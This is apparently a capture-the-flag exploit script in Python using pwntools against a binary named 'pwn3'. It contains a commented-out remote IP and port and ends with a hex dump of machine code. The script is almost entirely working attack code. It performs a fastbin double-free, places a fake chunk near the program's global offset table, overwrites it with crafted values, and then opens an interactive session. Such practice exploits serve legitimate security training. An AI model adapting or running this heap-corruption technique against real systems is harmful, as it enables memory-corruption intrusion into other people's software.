from pwn import *

r=process('./pwn3')
#r=remote('47.104.16.75',8999)
elf=ELF('pwn3')

def addnote(index,content):
	r.sendlineafter('2 delete paper\n','1')
	r.sendlineafter('(0-9):',str(index))
	r.sendlineafter('enter:',str(len(content)))
	r.sendlineafter('content:',content)
def deletenote(index):
	r.sendlineafter('2 delete paper\n','2')
	r.sendlineafter('(0-9):',str(index))
#def secret():
#	r.sendlineafter('2 delete paper\n','3')

fake_chunk_addr=p64(0x602032).ljust(8,'\x00')
fake_chunk_addr+=0x28*'\x00'
fake_chunk_fill=p64(0xd74000007fc16b56)+p64(0x0786000000000040)+p64(0x0750000000000040)+p64(0x0943000000000040)+p64(0x0750000000000040)+p64(0x84d0000000000040)
fake_chunk_fill=str(fake_chunk_fill).ljust(0x30,'\x00')

addnote(0,0x30*'a')
addnote(1,0x30*'b')
deletenote(0)
deletenote(1)
deletenote(0)
addnote(0,fake_chunk_addr)
addnote(2,0x30*'c')
addnote(3,0x30*'d')
addnote(4,fake_chunk_fill)

r.interactive()

'''
90 EB B0 55 48 89 E5 BF  08 0D 40 00 E8 FF FD FF
FF 5D C3 55 48 89 E5 48  83 EC 10 BF 11 0D 40 00
B8 00 00 00 00 E8 F6 FD  FF FF 48 8D 45 F8 48 89
C6 BF 29 0D 40 00 B8 00  00 00 00 E8 40 FE FF FF
BF 30 0D 40 00 E8 96 FD  FF FF B8 00 00 00 00 E8
9E 01 00 00 B8 00 00 00  00 E8 48 02 00 00 89 45
'''